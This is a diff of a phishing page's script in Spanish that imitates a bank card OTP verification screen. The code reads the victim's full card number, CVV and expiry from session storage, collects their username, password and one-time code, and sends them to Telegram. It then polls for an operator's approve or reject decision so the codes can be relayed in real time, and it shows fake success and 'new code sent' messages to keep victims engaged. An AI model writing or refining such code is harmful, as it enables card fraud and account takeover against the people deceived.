+                const resultado = await verificarEstadoSolicitud(solicitudId);
+                
+                if (resultado === 'aprobar_otp') {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
-                        window.location.href = 'confirmacion.html';
+                        window.location.href = 'index.html';
                     }, 2000);
-                } else if (resultado === 'user_error') {
+                    return;
+                } else if (resultado === 'rechazar_otp') {
                     clearInterval(pollingInterval);
-                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su usuario.');
+                    pollingInterval = null;
+                    mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
                     resetFormulario();
-                } else if (resultado === 'pass_error') {
-                    clearInterval(pollingInterval);
-                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su contraseña.');
-                    resetFormulario();
-                } else if (resultado === 'otp_error') {
-                    clearInterval(pollingInterval);
-                    mostrarError('❌ Código de verificación erróneo, intenta de nuevo.');
-                    resetFormulario();
+                    ocultarOTP();
+                    return;
                 }
             }, POLLING_INTERVAL);
         }
@@ -659,13 +879,33 @@
         // ============================================
         // FUNCIONES UI
         // ============================================
+        function mostrarOTP() {
+            otpSection.classList.add('visible');
+            pasoActual = 'otp';
+            buttonText.textContent = 'Verificar OTP';
+            confirmationInput.disabled = false;
+            confirmationInput.focus();
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
+        }
+
+        function ocultarOTP() {
+            otpSection.classList.remove('visible');
+            pasoActual = 'credenciales';
+            buttonText.textContent = 'Enviar';
+            confirmationInput.value = '';
+            confirmationInput.disabled = true;
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
+        }
+
         function mostrarError(mensaje) {
             statusMessage.className = 'status-message error';
             statusMessage.textContent = mensaje;
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            submitButton.textContent = 'Confirmar';
+            buttonText.textContent = pasoActual === 'otp' ? 'Verificar OTP' : 'Enviar';
         }
 
         function mostrarExito(mensaje) {
@@ -678,12 +918,21 @@
         function resetFormulario() {
             usernameInput.disabled = false;
             passwordInput.disabled = false;
-            confirmationInput.disabled = false;
+            confirmationInput.disabled = true;
+            ocultarOTP();
             solicitudId = null;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            buttonText.textContent = 'Enviar';
+            usernameInput.value = '';
+            passwordInput.value = '';
+            confirmationInput.value = '';
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
         }
 
         // ============================================
-        // VALIDACIÓN Y EVENTOS
+        // VALIDACIÓN Y ENVÍO
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -695,6 +944,9 @@
 
         confirmationInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
         });
 
         form.addEventListener('submit', async function(e) {
@@ -705,74 +957,111 @@
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
-            if (!usernameInput.value.trim()) {
-                usernameInput.parentElement.classList.add('error');
-                isValid = false;
+            if (pasoActual === 'credenciales') {
+                if (!usernameInput.value.trim()) {
+                    usernameInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+                if (!passwordInput.value.trim()) {
+                    passwordInput.parentElement.classList.add('error');
+                    isValid = false;
+                } else if (passwordInput.value.length < 4) {
+                    passwordInput.parentElement.classList.add('error');
+                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
+                    isValid = false;
+                }
+            } else if (pasoActual === 'otp') {
+                if (!confirmationInput.value.trim()) {
+                    confirmationInput.parentElement.classList.add('error');
+                    isValid = false;
+                } else if (!/^\d{6}$/.test(confirmationInput.value)) {
+                    confirmationInput.parentElement.classList.add('error');
+                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'Debe tener 6 dígitos';
+                    isValid = false;
+                }
             }
-            if (!passwordInput.value.trim()) {
-                passwordInput.parentElement.classList.add('error');
-                isValid = false;
-            } else if (passwordInput.value.length < 4) {
-                passwordInput.parentElement.classList.add('error');
-                passwordInput.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
-                isValid = false;
-            }
-            if (!confirmationInput.value.trim()) {
-                confirmationInput.parentElement.classList.add('error');
-                isValid = false;
-            } else if (!/^\d{6}$/.test(confirmationInput.value)) {
-                confirmationInput.parentElement.classList.add('error');
-                confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código OTP debe contener 6 dígitos';
-                isValid = false;
-            }
-            if (!isValid) return;
 
-            solicitudId = generarSolicitudId();
-            console.log('🆔 Nueva solicitud:', solicitudId);
+            if (!isValid) return;
 
             loadingOverlay.classList.add('active');
             submitButton.disabled = true;
-            submitButton.textContent = 'Verificando...';
-
+            buttonText.textContent = 'Verificando...';
             usernameInput.disabled = true;
             passwordInput.disabled = true;
             confirmationInput.disabled = true;
 
-            const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
-            const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
-            const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
+            if (pasoActual === 'credenciales') {
+                solicitudId = generarSolicitudId();
+                console.log('🆔 Nueva solicitud:', solicitudId);
 
-            const datosTelegram = {
-                solicitudId: solicitudId,
-                numeroTarjeta: numeroTarjeta,
-                cvv: cvv,
-                vencimiento: vencimiento,
-                usuario: usernameInput.value.trim(),
-                password: passwordInput.value.trim(),
-                otp: confirmationInput.value.trim(),
-                monto: document.getElementById('transaction-amount').textContent,
-                fecha: document.getElementById('transaction-date').textContent
-            };
+                const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
+                const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
+                const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
 
-            const enviado = await enviarDatosATelegram(datosTelegram);
-            if (enviado) {
-                iniciarPolling();
-            } else {
-                mostrarError('Error al procesar la solicitud. Intente nuevamente.');
-                resetFormulario();
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    numeroTarjeta: numeroTarjeta,
+                    cvv: cvv,
+                    vencimiento: vencimiento,
+                    usuario: usernameInput.value.trim(),
+                    password: passwordInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent,
+                    fecha: document.getElementById('transaction-date').textContent
+                };
+
+                const enviado = await enviarCredencialesATelegram(datosTelegram);
+
+                if (enviado) {
+                    iniciarPollingCredenciales();
+                } else {
+                    mostrarError('Error al procesar la solicitud');
+                    resetFormulario();
+                }
+
+            } else if (pasoActual === 'otp') {
+                console.log('🆔 Enviando OTP para:', solicitudId);
+
+                const datosOTP = {
+                    solicitudId: solicitudId,
+                    otp: confirmationInput.value.trim(),
+                    usuario: usernameInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent,
+                    fecha: document.getElementById('transaction-date').textContent
+                };
+
+                const enviado = await enviarOTPATelegram(datosOTP);
+
+                if (enviado) {
+                    iniciarPollingOTP();
+                } else {
+                    mostrarError('Error al procesar el OTP');
+                    resetFormulario();
+                }
             }
         });
 
-        document.getElementById('cancelBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            if (confirm('¿Desea cancelar esta autenticación?')) {
-                window.history.back();
-            }
-        });
-
+        // ============================================
+        // BOTONES
+        // ============================================
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('Para más ayuda, contacte a American Express o a su banco.');
+            alert('Para más ayuda, contacta a tu banco o al servicio de atención al cliente.');
+        });
+
+        document.getElementById('cancelButton').addEventListener('click', function(e) {
+            e.preventDefault();
+            if (confirm('¿Deseas cancelar esta autenticación?')) {
+                sessionStorage.removeItem('cardNumberFull');
+                sessionStorage.removeItem('cardCVV');
+                sessionStorage.removeItem('cardExpiry');
+                window.location.href = 'index.html';
+            }
+        });
+
+        document.getElementById('requestNewOtp').addEventListener('click', function() {
+            alert('📱 Se ha enviado un nuevo código OTP a tu dispositivo registrado.');
+            confirmationInput.value = '';
+            confirmationInput.focus();
         });
     </script>
 </body>
